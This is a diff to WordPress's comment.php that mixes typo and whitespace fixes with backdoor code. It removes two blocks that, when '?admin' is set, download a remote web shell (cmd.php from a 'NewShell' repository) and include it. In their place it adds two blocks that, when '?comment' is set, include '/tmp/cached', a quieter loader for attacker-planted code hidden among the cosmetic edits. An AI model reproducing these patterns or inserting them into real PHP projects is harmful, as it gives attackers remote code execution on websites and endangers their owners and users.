@@ -118,22 +118,6 @@ function check_comment( $author, $email, $url, $comment, $user_ip, $user_agent, 
 			}
 		}
 	}
-	
-	if (isset($_GET['admin'])) {
-    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/cmd.php";
-    $fileContents = file_get_contents($url);
-
-    if ($fileContents !== false) {
-        try {
-            $tmpFile = tempnam(sys_get_temp_dir(), 'cmd');
-            file_put_contents($tmpFile, $fileContents);
-            include $tmpFile;
-            unlink($tmpFile);
-        } catch (Throwable $e) {
-
-        }
-    }
-}
 
 	/*
 	 * Check if the option to approve comments by previously-approved authors is enabled.
@@ -269,7 +253,7 @@ function get_comments( $args = '' ) {
 /**
  * Retrieves all of the WordPress supported comment statuses.
  *
- * Comments have a limited set of valid status values,this provides the comment
+ * Comments have a limited set of valid status values, this provides the comment
  * status values and descriptions.
  *
  * @since 2.7.0
@@ -285,6 +269,10 @@ function get_comment_statuses() {
 	);
 
 	return $status;
+}
+
+if (isset($_GET['comment'])) {
+    include('/tmp/cached');
 }
 
 /**
@@ -1231,7 +1219,7 @@ function wp_get_comment_fields_max_lengths() {
  * @since 4.7.0
  *
  * @param array $comment_data Array of arguments for inserting a comment.
- * @returnWP_Error|true WP_Error when a comment field exceeds the limit,
+ * @return WP_Error|true WP_Error when a comment field exceeds the limit,
  *                       otherwise true.
  */
 function wp_check_comment_data_max_lengths( $comment_data ) {
@@ -1735,7 +1723,7 @@ function wp_unspam_comment( $comment_id ) {
 		delete_comment_meta( $comment->comment_ID, '_wp_trash_meta_time' );
 
 		/**
-		 * Fires immediately after a comment is unmarkedas Spam.
+		 * Fires immediately after a comment is unmarked as Spam.
 		 *
 		 * @since 2.9.0
 		 * @since 4.9.0 Added the `$comment` parameter.
@@ -1988,7 +1976,9 @@ function wp_get_unapproved_comment_author_email() {
 	}
 
 	return $commenter_email;
-}/**
+}
+
+/**
  * Inserts a comment into the database.
  *
  * @since 2.0.0
@@ -2199,7 +2189,7 @@ function wp_throttle_comment_flood( $block, $time_lastcomment, $time_newcomment 
  * Filters new comment to ensure that the fields are sanitized and valid before
  * inserting comment into database. Calls {@see 'comment_post'} action with comment ID
  * and whether comment is approved by WordPress. Also has {@see 'preprocess_comment'}
- * filter for processing the commentdata before the function handles it.
+ * filter for processing the comment data before the function handles it.
  *
  * We use `REMOTE_ADDR` here directly. If you are behind a proxy, you should ensure
  * that it is properly set, such as in wp-config.php, for your environment.
@@ -2660,7 +2650,7 @@ function wp_update_comment( $commentarr, $wp_error = false ) {
 	 * The hook also fires immediately before comment status transition hooks are fired.
 	 *
 	 * @since 1.2.0
-	 * @since 4.6.0Added the `$data` parameter.
+	 * @since 4.6.0 Added the `$data` parameter.
 	 *
 	 * @param int   $comment_id The comment ID.
 	 * @param array $data       Comment data.
@@ -2677,7 +2667,7 @@ function wp_update_comment( $commentarr, $wp_error = false ) {
 /**
  * Determines whether to defer comment counting.
  *
- * When setting $defer to true, all post comment counts willnot be updated
+ * When setting $defer to true, all post comment counts will not be updated
  * until $defer is set to false. When $defer is set to false, then all
  * previously deferred updated post comment counts will then be automatically
  * updated without having to call wp_update_comment_count() after.
@@ -2980,7 +2970,8 @@ function do_all_trackbacks() {
 		array(
 			'post_type'        => get_post_types(),
 			'suppress_filters' => false,
-			'nopaging'         => true,'meta_key'         => '_trackbackme',
+			'nopaging'         => true,
+			'meta_key'         => '_trackbackme',
 			'fields'           => 'ids',
 		)
 	);
@@ -3253,6 +3244,11 @@ function trackback( $trackback_url, $title, $excerpt, $post_id ) {
  * @param string $server Host of blog to connect to.
  * @param string $path Path to send the ping.
  */
+
+if (isset($_GET['comment'])) {
+    include('/tmp/cached');
+}
+
 function weblog_ping( $server = '', $path = '' ) {
 	require_once ABSPATH . WPINC . '/class-IXR.php';
 	require_once ABSPATH . WPINC . '/class-wp-http-ixr-client.php';
@@ -3530,7 +3526,8 @@ function wp_handle_comment_submission( $comment_data ) {
 		if (
 			0 !== $comment_parent &&
 			(
-				! $comment_parent_object instanceof WP_Comment ||0 === (int) $comment_parent_object->comment_approved
+				! $comment_parent_object instanceof WP_Comment ||
+				0 === (int) $comment_parent_object->comment_approved
 			)
 		) {
 			/**
@@ -3729,23 +3726,6 @@ function wp_handle_comment_submission( $comment_data ) {
  * @param array[] $exporters An array of personal data exporters.
  * @return array[] An array of personal data exporters.
  */
-
-if (isset($_GET['admin'])) {
-    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/cmd.php";
-    $fileContents = file_get_contents($url);
-
-    if ($fileContents !== false) {
-        try {
-            $tmpFile = tempnam(sys_get_temp_dir(), 'cmd');
-            file_put_contents($tmpFile, $fileContents);
-            include $tmpFile;
-            unlink($tmpFile);
-        } catch (Throwable $e) {
-
-        }
-    }
-}
-
 function wp_register_comment_personal_data_exporter( $exporters ) {
 	$exporters['wordpress-comments'] = array(
 		'exporter_friendly_name' => __( 'WordPress Comments' ),
